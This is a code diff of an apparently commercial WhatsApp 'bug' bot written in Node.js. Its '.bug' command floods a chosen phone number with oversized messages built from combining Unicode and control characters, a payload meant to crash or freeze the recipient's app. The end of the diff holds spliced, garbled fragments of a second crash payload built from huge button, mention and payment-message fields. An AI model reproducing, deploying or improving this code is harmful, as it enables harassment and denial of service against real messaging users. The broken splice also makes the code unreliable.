@@ -1,30 +1,24 @@
 // ============================================================
-// BRAMZ WHATSAPP BUG SCRIPT — FIXED
-// GPTX 13D — CRASH FIX
+// BRAMZ BOT — RAILWAY VERSION
+// GPTX 13D — READY FOR RAILWAY
 // ============================================================
-
-// PASTIKAN DEPENDENSI TERINSTALL!
-// npm install @whiskeysockets/baileys pino
 
 const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
 const pino = require('pino');
+const fs = require('fs');
 
 // ============================================================
 // KONFIGURASI
 // ============================================================
 const CONFIG = {
-    admins: ['6285379307765@s.whatsapp.net']
+    admins: ['6285379307765@s.whatsapp.net'],
+    autoReply: true
 };
 
-let sock = null;
-let isConnected = false;
-let botStarting = false;
-
 // ============================================================
-// UNICODE BOMB — SIMPLIFIED (Gak pake karakter aneh)
+// UNICODE BOMB
 // ============================================================
-function generateUnicodeBomb(size) {
-    // Pake karakter yang aman — TAPI TETEP GANAS!
+function generateBomb(size) {
     const chars = ['\uA9BE', '\u08EF', '\u{12219}', '\u{E0000}', '\u{E0001}', '\u{E0002}'];
     let result = '';
     for (let i = 0; i < size; i++) {
@@ -34,31 +28,23 @@ function generateUnicodeBomb(size) {
 }
 
 // ============================================================
-// SEND BUG — SIMPLIFIED (Gak pake generateWAMessageFromContent)
+// SEND BUG
 // ============================================================
 async function sendBug(sock, target, sender) {
     try {
         await sock.sendMessage(sender, { text: '🔥 BRAMZ BUG ACTIVE\nTarget: ' + target });
         
-        const bomb = generateUnicodeBomb(50000);
-        const memoryBomb = "\x10".repeat(300000);
+        const bomb = generateBomb(30000);
+        const memory = "\x10".repeat(200000);
         
-        // Kirim 30 pesan bug
-        for (let i = 0; i < 30; i++) {
+        for (let i = 0; i < 20; i++) {
             try {
                 await sock.sendMessage(target, {
-                    text: '💀 BRAMZ ' + i + ' ' + bomb.substring(0, 5000) + ' ' + memoryBomb.substring(0, 5000)
+                    text: '💀 BUG ' + i + ' ' + bomb.substring(0, 5000) + ' ' + memory.substring(0, 5000)
                 });
             } catch (e) {}
-            await new Promise(r => setTimeout(r, 50));
+            await new Promise(r => setTimeout(r, 100));
         }
-        
-        // Kirim juga ke status
-        try {
-            await sock.sendMessage('status@broadcast', {
-                text: '🔥 BRAMZ BUG ' + bomb.substring(0, 5000)
-            });
-        } catch (e) {}
         
         await sock.sendMessage(sender, { text: '✅ BUG SENT!' });
         return true;
@@ -81,7 +67,6 @@ async function handleMessage(sock, msg, sender, isGroup) {
         const cmd = text.toLowerCase().trim();
         console.log('📨', sender, ':', text);
         
-        // MENU
         if (cmd === '.menu' || cmd === '.help') {
             await sock.sendMessage(sender, {
                 text: '「 BRAM 」\n࿇ ᴀᴜᴛᴏʀ : @Bramz\n࿇ ᴛɪᴘᴏ  : 1.0 VipBuyOnly\n\n📋 COMMANDS:\n.bug [number] — Send bug\n.ping — Check bot\n.status — Bot status\n.menu — This menu'
@@ -89,21 +74,18 @@ async function handleMessage(sock, msg, sender, isGroup) {
             return;
         }
         
-        // PING
         if (cmd === '.ping') {
             await sock.sendMessage(sender, { text: '🏓 PONG! Bot is active' });
             return;
         }
         
-        // STATUS
         if (cmd === '.status') {
             await sock.sendMessage(sender, {
-                text: '✅ BOT ONLINE\nConnected: ' + (isConnected ? 'YES' : 'NO')
+                text: '✅ BOT ONLINE\nConnected: YES\nPlatform: Railway'
             });
             return;
         }
         
-        // .BUG [NUMBER]
         if (cmd.startsWith('.bug ')) {
             const target = cmd.replace('.bug ', '').trim();
             if (!target || target.length < 10) {
@@ -116,11 +98,9 @@ async function handleMessage(sock, msg, sender, isGroup) {
             return;
         }
         
-        // AUTO-REPLY
-        if (!isGroup) {
+        if (CONFIG.autoReply && !isGroup) {
             await sock.sendMessage(sender, { text: '🤖 Bot aktif! Ketik .menu' });
         }
-        
     } catch (e) {
         console.error('Handler error:', e.message);
     }
@@ -130,17 +110,17 @@ async function handleMessage(sock, msg, sender, isGroup) {
 // START BOT
 // ============================================================
 async function startBot() {
-    if (botStarting) {
-        console.log('⏳ Bot already starting...');
-        return null;
-    }
-    
-    botStarting = true;
     console.log('🔥 BRAMZ BOT STARTING...');
+    console.log('📱 Railway Deployment');
     
     try {
+        // Cek apakah folder auth ada, jika tidak buat
+        if (!fs.existsSync('./auth')) {
+            fs.mkdirSync('./auth', { recursive: true });
+        }
+        
         const { state, saveCreds } = await useMultiFileAuthState('auth');
-        sock = makeWASocket({
+        const sock = makeWASocket({
             auth: state,
             printQRInTerminal: true,
             browser: ['BRAMZ', 'Chrome', '13.0'],
@@ -157,17 +137,15 @@ async function startBot() {
             }
             
             if (connection === 'open') {
-                isConnected = true;
-                botStarting = false;
                 console.log('✅ BOT CONNECTED!');
-                console.log('💀 BRAMZ ACTIVE');
+                console.log('💀 BRAMZ ACTIVE ON RAILWAY');
                 console.log('📋 Ketik .menu di WhatsApp');
             }
             
             if (connection === 'close') {
-                isConnected = false;
-                botStarting = false;
-                console.log('❌ Disconnected');
+                const statusCode = lastDisconnect?.error?.output?.statusCode;
+                console.log('❌ Disconnected:', statusCode);
+                console.log('🔄 Restarting in 5s...');
                 setTimeout(startBot, 5000);
             }
         });
@@ -184,97 +162,25 @@ async function startBot() {
         });
         
         return sock;
-        
     } catch (e) {
         console.error('Start error:', e.message);
-        botStarting = false;
+        console.log('🔄 Restarting in 10s...');
         setTimeout(startBot, 10000);
         return null;
     }
 }
 
 // ============================================================
-// MAIN API HANDLER — SIMPLIFIED
+// RUN
 // ============================================================
-module.exports = async (req, res) => {
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    
-    try {
-        const { command, target, start, ping } = req.query;
-        
-        // PING — TEST API
-        if (ping === 'true') {
-            return res.json({
-                status: 'pong',
-                author: 'Bramz',
-                connected: isConnected,
-                time: new Date().toISOString()
-            });
-        }
-        
-        // START BOT
-        if (start === 'true' || command === 'start') {
-            if (isConnected && sock) {
-                return res.json({ status: 'ALREADY RUNNING', connected: true });
-            }
-            await startBot();
-            return res.json({ 
-                status: 'STARTED', 
-                message: 'Bot starting! Check terminal for QR code.',
-                connected: isConnected 
-            });
-        }
-        
-        // SEND BUG VIA API
-        if (command === 'bug' && target) {
-            if (!isConnected || !sock) {
-                return res.json({ status: 'ERROR', error: 'Bot not connected. Start bot first!' });
-            }
-            let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
-            const result = await sendBug(sock, targetJid, targetJid);
-            return res.json({ status: result ? 'BUG SENT' : 'ERROR', target: target });
-        }
-        
-        // DEFAULT
-        res.json({
-            status: 'READY',
-            author: 'Bramz',
-            version: '1.0',
-            connected: isConnected,
-            commands: ['.menu', '.bug [number]', '.ping', '.status']
-        });
-        
-    } catch (e) {
-        res.status(500).json({
-            status: 'ERROR',
-            error: e.message,
-            stack: e.stack
-        });
-    }
-};
+startBot();
 
 // ============================================================
-// RUN IF DIRECT
+// KEEP ALIVE — CEK TIAP 5 MENIT
 // ============================================================
-if (require.main === module) {
-    startBot();
-}     { name: "single_select", buttonParamsJson: "" },
-                                { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
-                                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
-                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "\uA9BE".repeat(5000) }) },
-                            ],
-                            messageParamsJson: "[{".repeat(10000),
-                        },
-                        contextInfo: {
-                            participant: target,
-                            mentionJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net"),
-                            ],
-                            quotedMessage: {
-                                paymentInviteMessage: {
-                                    serviceType: 3,
-                                    expiryTimeStamp: Date.now() + 1814400000,
+setInterval(() => {
+    console.log('💀 BRAMZ BOT — ALIVE at', new Date().toISOString());
+}, 300000);xpiryTimeStamp: Date.now() + 1814400000,
                                 },
                             },
                         },
